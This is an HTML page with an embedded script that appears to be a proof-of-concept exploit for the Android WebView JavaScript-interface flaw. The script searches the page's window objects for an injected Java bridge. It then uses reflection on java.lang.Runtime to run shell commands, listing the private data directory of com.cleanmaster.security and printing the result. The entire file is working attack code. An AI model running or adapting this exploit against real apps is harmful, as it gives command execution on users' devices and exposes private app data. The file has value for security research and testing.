<html>
   <body>
      <b>Exported Interface</b>
      <script>

      var injectedObj;
      function check()
      {
        var found;
          for (var obj in window) 
          {
              try {
                  if ("getClass" in window[obj]) {
                      try{
                        found = window[obj];
                          window[obj].getClass();
                          document.write('<span style="color:red">'+obj+'</span>');
                          document.write('<br />');
                      }catch(e){
                      }   
                  }
              } catch(e) {
              }
          }
          injectedObj = found;
      }
      check();

      function hack() {
        if(injectedObj==null)
          return;

        var i=0; 
        function getContents(inputStream) 
        { 
            var contents = ""+i; 
            var b = inputStream.read(); 
            var i = 1; 
            while(b != -1) { 
                var bString = String.fromCharCode(b); 
                contents += bString; 
                contents += "\n" 
                b = inputStream.read(); 
            } 
            i=i+1; 
            return contents; 
        } 

        function execute(cmdArgs)
        {
            return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
        }

        document.write('<hr><span style="color:red"> ls -al /data/data/com.cleanmaster.security/ </span>');
        document.write('<br />');

        var res = execute(["/system/bin/sh", "-c", "ls -al /data/data/com.cleanmaster.security/"]);
        document.write(getContents(res.getInputStream()));
      }

      hack();

       </script>
   </body>
</html>


